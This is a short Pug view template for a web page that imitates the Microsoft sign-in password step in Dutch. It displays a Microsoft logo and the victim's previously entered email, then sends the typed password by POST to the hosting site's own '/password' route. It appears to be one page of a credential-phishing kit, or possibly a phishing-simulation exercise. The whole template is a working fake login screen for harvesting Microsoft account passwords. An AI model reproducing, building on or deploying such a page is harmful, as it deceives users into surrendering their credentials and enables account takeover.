block variables
    title = "Login Password"

extends layout

block content
    .container
        #form.w-100.d-flex.justify-content-center.align-items-center
            form(class="col-lg-5 col-md-8 col-sm-12 shadow-lg p-4 mb-5 bg-body rounded", action="/password", method="POST")
                .d-grid.gap-4
                    .d-flex
                        img(src='../MS%20Logo.jpg', style='height: 2.5rem; ', alt='Microsoft Logo')
                        h2#microsoft.px-2 Microsoft
                    #example.p #{email}
                #signin.h1 Wachtwoord invoern
                .form-group
                    label(for='password')
                    input#password(type='password', placeholder='Wachtwoord', name='password', required = true)
                .d-grid.mt-3.mb-2
                    a#forgot.link-primary(href='#') Wachtwoord vergeten?
                    .d-flex.flex-row.justify-content-end
                        button#login.btn.btn-primary(type='submit', style='background-color: #0864b4') Aanmelden
                    br
    script(src='https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.min.js')
